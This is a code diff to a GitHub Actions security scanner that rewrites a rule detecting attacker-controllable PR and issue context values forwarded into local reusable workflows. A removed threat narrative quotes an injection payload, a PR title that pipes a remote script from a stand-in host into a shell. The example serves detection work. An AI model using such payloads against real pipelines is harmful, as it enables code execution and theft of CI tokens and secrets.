@@ -403,6 +403,25 @@ _TAINT_004_REMEDIATION = "Keep untrusted values as data. Bind the value with env
 # ---------------------------------------------------------------------------
 
 
+_LOCAL_REUSABLE_CONTEXT_RE = re.compile(
+    r"\$\{\{\s*github\.(event\.(issue\.(title|body)"
+    r"|pull_request\.(title|body|head\.ref|user\.login)"
+    r"|comment\.body|review\.body"
+    r"|head_commit\.(message|author\.(email|name)))"
+    r"|head_ref)"
+)
+
+
+def _is_local_reusable_event_binding(
+    value: str, _value_kind: str, path: tuple[object, ...], ctx: PredicateContext
+) -> bool:
+    target = ctx.get_value(path[:2] + ("uses",)) or ""
+    return bool(
+        re.fullmatch(r"\./\.github/workflows/[\w.-]+\.ya?ml", target)
+        and _LOCAL_REUSABLE_CONTEXT_RE.search(value)
+    )
+
+
 RULES = [
     Rule(
         id="TAINT-GH-001",
@@ -1130,95 +1149,30 @@ RULES = [
     # blocks.
     Rule(
         id="TAINT-GH-007",
-        title="Attacker-controlled context passed to reusable workflow (caller-side)",
-        severity=Severity.HIGH,
+        title="GitHub context passed to a local reusable workflow input",
+        severity=Severity.MEDIUM,
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A job invokes a local reusable workflow (``uses: ./.github/"
-            "workflows/*.yml``) and, in the same job, references an "
-            "attacker-controlled GitHub context (PR title, body, "
-            "head_ref, issue body, comment body, commit message).  "
-            "The ``with:`` block passes the substituted value into the "
-            "reusable workflow's ``inputs.*`` namespace — where "
-            "TAINT-GH-006 surfaces the reference on the callee side.  "
-            "If the caller's triggering event is fork-reachable "
-            "(``pull_request_target``, ``issue_comment``, ...), the "
-            "attacker-controlled bytes land in the reusable workflow's "
-            "execution context with the reusable's GITHUB_TOKEN and "
-            "any secrets the caller forwards."
+            "The owning job forwards a GitHub context value through a named with input "
+            "to a local reusable workflow. The caller's event and job guard determine "
+            "who can supply the value. Assess how the selected callee consumes the input "
+            "and which token permissions or secrets the invocation is configured to receive."
         ),
-        pattern=ContextPattern(
-            # Attacker-controlled GitHub contexts.  Kept in sync with
-            # SEC4-GH-004 and the _TAINTED_CONTEXTS list in
-            # taintly/taint.py.
-            #
-            # Intentionally does NOT include ``pull_request.head.sha``
-            # or ``pull_request.base.sha`` — those are immutable git
-            # hashes, not attacker-controllable strings.  The branch
-            # NAME (``head.ref`` / ``head_ref``) IS attacker-
-            # controllable and stays in.
-            anchor=(
-                r"\$\{\{\s*github\.(event\.(issue\.(title|body)"
-                r"|pull_request\.(title|body|head\.ref|user\.login)"
-                r"|comment\.body|review\.body"
-                r"|head_commit\.(message|author\.(email|name)))"
-                r"|head_ref)"
-            ),
-            # Same job must invoke a local reusable workflow.  Remote
-            # reusables (``uses: org/repo/.github/workflows/x.yml@ref``)
-            # are a distinct threat model and out of scope for this
-            # first cut — local-only keeps the signal high.
-            requires=r"uses:\s+\./\.github/workflows/[\w/.-]+\.ya?ml",
-            exclude=[
-                # Comment-only lines.
-                r"^\s*#",
-                # ``if:`` conditionals are engine-evaluated, not bash.
-                r"^\s*if\s*:",
-                # ``run:`` lines are caught by SEC4-GH-004 already; keep
-                # this rule focused on the ``with:`` / non-run pathway.
-                r"^\s*run\s*:",
-            ],
-            scope="job",
+        pattern=WorkflowAwarePattern(
+            path="jobs.*.with.*",
+            predicate=_is_local_reusable_event_binding,
         ),
+        review_needed=True,
         remediation=(
-            "Don't forward attacker-controlled context into a "
-            "reusable workflow.  Sanitise at the caller:\n"
-            "\n"
-            "1. Pin the reusable to a SHA and pass only trusted\n"
-            "   contexts (SHA, ref from ``github.event.workflow_run``\n"
-            "   on a push-only upstream, static strings).\n"
-            "\n"
-            "2. If the reusable truly needs PR metadata, copy into\n"
-            "   an env var first and sanitise (e.g. allowlist-regex)\n"
-            "   before passing:\n"
-            "     jobs:\n"
-            "       validate:\n"
-            "         runs-on: ubuntu-latest\n"
-            "         outputs:\n"
-            "           safe_title: ${{ steps.check.outputs.t }}\n"
-            "         steps:\n"
-            "           - id: check\n"
-            "             env:\n"
-            "               RAW: ${{ github.event.pull_request.title }}\n"
-            "             run: |\n"
-            '               [[ "$RAW" =~ ^[A-Za-z0-9._\\ -]+$ ]] '
-            "|| { echo '::error::bad title'; exit 1; }\n"
-            '               echo "t=$RAW" >> $GITHUB_OUTPUT\n'
-            "       call:\n"
-            "         needs: validate\n"
-            "         uses: ./.github/workflows/build.yml\n"
-            "         with:\n"
-            "           title: ${{ needs.validate.outputs.safe_title }}\n"
-            "\n"
-            "3. Trigger the reusable from ``workflow_run`` instead of\n"
-            "   ``pull_request_target`` — the upstream push-only\n"
-            "   workflow already validated the PR, so attacker bytes\n"
-            "   can't reach the reusable directly."
+            "Trace this named input in the reusable workflow from the same source revision. "
+            "If the input is data, keep it out of executable source and pass it as quoted "
+            "data at the consumer. Verify the originating event and job guard before "
+            "claiming external caller control."
         ),
         reference=(
-            "https://docs.github.com/en/actions/using-workflows/"
-            "reusing-workflows#passing-inputs-and-secrets-to-a-reusable-workflow"
+            "https://docs.github.com/en/actions/how-tos/reuse-automations/"
+            "reuse-workflows#passing-inputs-and-secrets-to-a-reusable-workflow"
         ),
         test_positive=[
             # Canonical pull_request_target caller passing PR title
@@ -1267,18 +1221,9 @@ RULES = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An attacker opens a PR whose title is "
-            '``"; curl evil.sh | sh ; #``.  The caller workflow '
-            "runs on ``pull_request_target`` and calls "
-            "``./.github/workflows/build.yml`` with "
-            "``title: ${{ github.event.pull_request.title }}``.  The "
-            "reusable workflow references ``${{ inputs.title }}`` in "
-            "a ``run:`` block (TAINT-GH-006 would flag that on the "
-            "callee side).  The substituted bytes execute in the "
-            "reusable workflow's job with the reusable's "
-            "GITHUB_TOKEN and any forwarded secrets.  Same Ultralytics-"
-            "December-2024 injection shape, but the taint crosses a "
-            "workflow boundary so SEC4-GH-004 alone cannot catch it."
+            "An invocation that forwards a variable value can expose executable code "
+            "when the selected callee interpolates it into a script and an untrusted "
+            "actor can supply the value. The caller-side binding is one piece of that proof."
         ),
         incidents=["Ultralytics December 2024"],
         confidence="high",
